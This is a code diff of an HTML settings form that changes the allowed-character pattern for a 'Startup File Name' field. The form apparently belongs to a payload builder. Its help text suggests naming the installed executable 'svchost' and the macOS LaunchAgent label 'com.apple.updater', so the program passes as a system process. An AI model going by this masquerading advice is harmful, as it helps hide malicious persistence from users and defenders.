@@ -1007,7 +1007,7 @@
                           <i class="fa-solid fa-file-signature text-blue-400"></i> Startup File Name
                         </div>
                         <input type="text" id="startup-name" name="startup-name" maxlength="32"
-                          pattern="[A-Za-z0-9_.-]+"
+                          pattern="[A-Za-z0-9_.\x2d]+"
                           placeholder="ovd (default)"
                           class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-orange-500 transition-colors placeholder:text-slate-600" />
                         <p class="text-xs text-slate-500 mt-1">Custom name for the installed executable. On Windows: used as filename (<code>svchost</code> → <code>svchost.exe</code>). On macOS: also used as the LaunchAgent label — <span id="startup-name-macos-hint" class="hidden text-orange-400 font-medium">must start with <code>com.</code> (e.g. <code>com.apple.updater</code>).</span><span id="startup-name-default-hint">Leave blank for a default randomized name.</span></p>
